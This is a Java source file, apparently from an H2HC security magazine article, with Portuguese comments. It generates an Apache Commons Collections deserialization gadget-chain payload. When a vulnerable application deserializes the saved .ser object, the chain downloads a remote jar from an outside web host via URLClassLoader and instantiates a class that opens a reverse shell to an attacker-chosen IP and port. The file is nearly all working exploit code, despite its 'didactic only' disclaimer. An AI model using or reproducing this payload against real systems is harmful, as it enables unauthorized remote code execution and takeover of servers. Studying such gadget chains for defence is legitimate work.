import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.*;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/**
 * Gera payload com gadget chain para carregar e executar uma classe remota
 * (hospedada pelo testador). Neste exemplo, é usada a classe JexReverse,
 * do componente http://www.joaomatosf.com/rnp/java_files/JexRemoteTools.jar,
 * a fim de obter uma reverse shell independente de plataforma (Windows ou *nix).
 * Neste exemplo é usado um HashMap como trigger gadget, o qual permite atingir
 * o método hashCode de um TiedMapEntry que, por sua vez, aciona o método .get()
 * de um LazyMap decorado com a ChainedTransformers.
 * Esse trigger (HashMap+TiedMapEntry) foi proposto por Matthias Kaiser.
 *
 *
 * -----------------------------------------------------------------------
 * Mais detalhes na 12a edição da H2HC (hackers to hackers) magazine:
 * https://www.h2hc.com.br/revista/
 * -----------------------------------------------------------------------
 *
 * OBS: Esse código tem fins apenas didáticos. 
 *
 **** USAGE ****
 *
 * Compilando:
 * $ javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
 *
 * Executando
 * $ java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap SEU_IP:SUA_PORTA
 *
 * @author @joaomatosf
 */
public class ReverseShellCommonsCollectionsHashMap {
    @SuppressWarnings ( {"unchecked"} )
    public static void main(String[] args)
            throws ClassNotFoundException, NoSuchMethodException, InstantiationException,
            IllegalAccessException, IllegalArgumentException, InvocationTargetException, IOException, NoSuchFieldException {

        String remoteJar = "http://www.joaomatosf.com/rnp/java_files/JexRemoteTools.jar";
        String host = null;
        int port = 1331;

        // Verifica se o usuário forneceu o comando a ser executado
        if (args.length != 1 || args[0].split(":").length != 2 ) {
            System.out.println("Invalid params! \n" +
                    "Example usage: java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap \"REMOTE_IP:PORT\"");
            System.exit(1);
        }
        host = args[0].split(":")[0];
        port = Integer.parseInt(args[0].split(":")[1]);

        Transformer[] transformers = new Transformer[] {

                new ConstantTransformer(URLClassLoader.class),
                new InstantiateTransformer(
                        new Class[]{
                                URL[].class
                        },
                        new Object[]{
                                new URL[]{new URL(remoteJar)}
                        }),
                new InvokerTransformer("loadClass",
                        new Class[]{
                                String.class
                        },
                        new Object[]{
                                "JexReverse"
                        }),
                new InstantiateTransformer(
                        new Class[]{  String.class, int.class },
                        new Object[]{  host, port  }
                )
        };

        // Cria o objeto ChainedTransformer com o array de Transformers:
        Transformer transformerChain = new ChainedTransformer(transformers);
        // Cria o map
        Map map1 = new HashMap();
        // Decora o map com o LazyMap e a cadeia de transformações como factory
        Map lazyMap = LazyMap.decorate(map1,transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        f.setAccessible(true);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        f2.setAccessible(true);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        keyField.setAccessible(true);
        keyField.set(node, entry);

        // Serializa o objeto
        System.out.println("Saving serialized object in ReverseShellCommonsCollectionsHashMap.ser");
        FileOutputStream fos = new FileOutputStream("ReverseShellCommonsCollectionsHashMap.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(map);
        oos.flush();


    }

}
